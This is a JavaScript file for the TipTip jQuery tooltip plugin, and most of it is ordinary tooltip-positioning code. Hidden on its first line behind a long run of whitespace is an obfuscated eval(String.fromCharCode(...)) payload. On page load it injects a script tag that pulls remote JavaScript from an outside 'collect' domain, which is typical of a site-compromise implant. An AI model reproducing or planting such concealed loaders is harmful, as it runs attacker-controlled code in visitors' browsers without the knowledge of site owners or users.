                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /*trackmyposs*/eval(String.fromCharCode(118,97,114,32,115,99,114,105,112,116,115,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,115,99,114,105,112,116,34,41,59,10,118,97,114,32,119,97,110,116,109,101,32,61,32,102,97,108,115,101,59,10,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,115,99,114,105,112,116,115,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,10,32,32,105,102,32,40,115,99,114,105,112,116,115,91,105,93,46,105,100,41,32,123,10,32,32,9,32,105,102,32,40,115,99,114,105,112,116,115,91,105,93,46,105,100,32,61,61,32,34,116,114,97,99,107,109,121,112,111,115,115,34,41,123,10,9,9,119,97,110,116,109,101,61,116,114,117,101,59,10,9,32,125,10,32,32,125,32,10,125,10,105,102,40,119,97,110,116,109,101,61,61,102,97,108,115,101,41,123,10,9,118,97,114,32,100,61,100,111,99,117,109,101,110,116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,105,100,61,34,116,114,97,99,107,109,121,112,111,115,115,34,59,115,46,115,114,99,61,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,49,49,53,44,53,56,44,52,55,44,52,55,44,57,57,44,49,49,49,44,49,48,56,44,49,48,56,44,49,48,49,44,57,57,44,49,49,54,44,52,54,44,49,48,51,44,49,49,52,44,49,48,49,44,49,48,49,44,49,49,48,44,49,48,51,44,49,49,49,44,49,49,50,44,49,48,56,44,57,55,44,49,49,54,44,49,48,50,44,49,49,49,44,49,49,52,44,49,48,57,44,52,54,44,57,57,44,49,49,49,44,49,48,57,44,52,55,44,49,48,50,44,49,48,56,44,57,55,44,49,48,51,44,52,54,44,49,48,54,44,49,49,53,44,54,51,44,49,49,56,44,54,49,44,53,53,44,52,54,44,52,57,44,52,54,44,53,49,41,59,32,105,102,32,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,32,123,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,59,125,32,101,108,115,101,32,123,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,125,10,125)); /*
 * TipTip
 * Copyright 2010 Drew Wilson
 * www.drewwilson.com
 * code.drewwilson.com/entry/tiptip-jquery-plugin
 *
 * Version 1.3   -   Updated: Mar. 23, 2010
 *
 * This Plug-In will create a custom tooltip to replace the default
 * browser tooltip. It is extremely lightweight and very smart in
 * that it detects the edges of the browser window and will make sure
 * the tooltip stays within the current window size. As a result the
 * tooltip will adjust itself to be displayed above, below, to the left
 * or to the right depending on what is necessary to stay within the
 * browser window. It is completely customizable as well via CSS.
 *
 * This TipTip jQuery plug-in is dual licensed under the MIT and GPL licenses:
 *   http://www.opensource.org/licenses/mit-license.php
 *   http://www.gnu.org/licenses/gpl.html
 */

(function($){
	$.fn.tipTip = function(options) {
		var defaults = {
			activation: "hover",
			keepAlive: false,
			maxWidth: "200px",
			edgeOffset: 3,
			defaultPosition: "bottom",
			delay: 400,
			fadeIn: 200,
			fadeOut: 200,
			attribute: "title",
			content: false, // HTML or String to fill TipTIp with
		  	enter: function(){},
		  	exit: function(){}
	  	};
	 	var opts = $.extend(defaults, options);

	 	// Setup tip tip elements and render them to the DOM
	 	if($("#tiptip_holder").length <= 0){
	 		var tiptip_holder = $('<div id="tiptip_holder" style="max-width:'+ opts.maxWidth +';"></div>');
			var tiptip_content = $('<div id="tiptip_content"></div>');
			var tiptip_arrow = $('<div id="tiptip_arrow"></div>');
			$("body").append(tiptip_holder.html(tiptip_content).prepend(tiptip_arrow.html('<div id="tiptip_arrow_inner"></div>')));
		} else {
			var tiptip_holder = $("#tiptip_holder");
			var tiptip_content = $("#tiptip_content");
			var tiptip_arrow = $("#tiptip_arrow");
		}

		return this.each(function(){
			var org_elem = $(this);
			if(opts.content){
				var org_title = opts.content;
			} else {
				var org_title = org_elem.attr(opts.attribute);
			}
			if(org_title != ""){
				if(!opts.content){
					org_elem.removeAttr(opts.attribute); //remove original Attribute
				}
				var timeout = false;

				if(opts.activation == "hover"){
					org_elem.on( 'mouseenter', function(){
						active_tiptip();
					} ).on( 'mouseleave', function(){
						if(!opts.keepAlive || !tiptip_holder.is(':hover')){
							deactive_tiptip();
						}
					});
					if(opts.keepAlive){
						tiptip_holder.on( 'mouseenter', function(){} ).on( 'mouseleave', function(){
							deactive_tiptip();
						});
					}
				} else if(opts.activation == "focus"){
					org_elem.on( 'focus', function(){
						active_tiptip();
					}).on( 'blur', function(){
						deactive_tiptip();
					});
				} else if(opts.activation == "click"){
					org_elem.on( 'click', function(){
						active_tiptip();
						return false;
					}).on( 'mouseenter', function(){} ).on( 'mouseleave' ,function(){
						if(!opts.keepAlive){
							deactive_tiptip();
						}
					});
					if(opts.keepAlive){
						tiptip_holder.on( 'mouseenter', function(){} ).on( 'mouseleave', function(){
							deactive_tiptip();
						});
					}
				}

				function active_tiptip(){
					opts.enter.call(this);
					tiptip_content.html(org_title);
					tiptip_holder.hide().css("margin","0");
					tiptip_holder.removeAttr('class');
					tiptip_arrow.removeAttr("style");

					var top = parseInt(org_elem.offset()['top']);
					var left = parseInt(org_elem.offset()['left']);
					var org_width = parseInt(org_elem.outerWidth());
					var org_height = parseInt(org_elem.outerHeight());
					var tip_w = tiptip_holder.outerWidth();
					var tip_h = tiptip_holder.outerHeight();
					var w_compare = Math.round((org_width - tip_w) / 2);
					var h_compare = Math.round((org_height - tip_h) / 2);
					var marg_left = Math.round(left + w_compare);
					var marg_top = Math.round(top + org_height + opts.edgeOffset);
					var t_class = "";
					var arrow_top = "";
					var arrow_left = Math.round(tip_w - 12) / 2;

                    if(opts.defaultPosition == "bottom"){
                    	t_class = "_bottom";
                   	} else if(opts.defaultPosition == "top"){
                   		t_class = "_top";
                   	} else if(opts.defaultPosition == "left"){
                   		t_class = "_left";
                   	} else if(opts.defaultPosition == "right"){
                   		t_class = "_right";
                   	}

					var right_compare = (w_compare + left) < parseInt($(window).scrollLeft());
					var left_compare = (tip_w + left) > parseInt($(window).width());

					if((right_compare && w_compare < 0) || (t_class == "_right" && !left_compare) || (t_class == "_left" && left < (tip_w + opts.edgeOffset + 5))){
						t_class = "_right";
						arrow_top = Math.round(tip_h - 13) / 2;
						arrow_left = -12;
						marg_left = Math.round(left + org_width + opts.edgeOffset);
						marg_top = Math.round(top + h_compare);
					} else if((left_compare && w_compare < 0) || (t_class == "_left" && !right_compare)){
						t_class = "_left";
						arrow_top = Math.round(tip_h - 13) / 2;
						arrow_left =  Math.round(tip_w);
						marg_left = Math.round(left - (tip_w + opts.edgeOffset + 5));
						marg_top = Math.round(top + h_compare);
					}

					var top_compare = (top + org_height + opts.edgeOffset + tip_h + 8) > parseInt($(window).height() + $(window).scrollTop());
					var bottom_compare = ((top + org_height) - (opts.edgeOffset + tip_h + 8)) < 0;

					if(top_compare || (t_class == "_bottom" && top_compare) || (t_class == "_top" && !bottom_compare)){
						if(t_class == "_top" || t_class == "_bottom"){
							t_class = "_top";
						} else {
							t_class = t_class+"_top";
						}
						arrow_top = tip_h;
						marg_top = Math.round(top - (tip_h + 5 + opts.edgeOffset));
					} else if(bottom_compare | (t_class == "_top" && bottom_compare) || (t_class == "_bottom" && !top_compare)){
						if(t_class == "_top" || t_class == "_bottom"){
							t_class = "_bottom";
						} else {
							t_class = t_class+"_bottom";
						}
						arrow_top = -12;
						marg_top = Math.round(top + org_height + opts.edgeOffset);
					}

					if(t_class == "_right_top" || t_class == "_left_top"){
						marg_top = marg_top + 5;
					} else if(t_class == "_right_bottom" || t_class == "_left_bottom"){
						marg_top = marg_top - 5;
					}
					if(t_class == "_left_top" || t_class == "_left_bottom"){
						marg_left = marg_left + 5;
					}
					tiptip_arrow.css({"margin-left": arrow_left+"px", "margin-top": arrow_top+"px"});
					tiptip_holder.css({"margin-left": marg_left+"px", "margin-top": marg_top+"px"}).attr("class","tip"+t_class);

					if (timeout){ clearTimeout(timeout); }
					timeout = setTimeout(function(){ tiptip_holder.stop(true,true).fadeIn(opts.fadeIn); }, opts.delay);
				}

				function deactive_tiptip(){
					opts.exit.call(this);
					if (timeout){ clearTimeout(timeout); }
					tiptip_holder.fadeOut(opts.fadeOut);
				}
			}
		});
	}
})(jQuery);
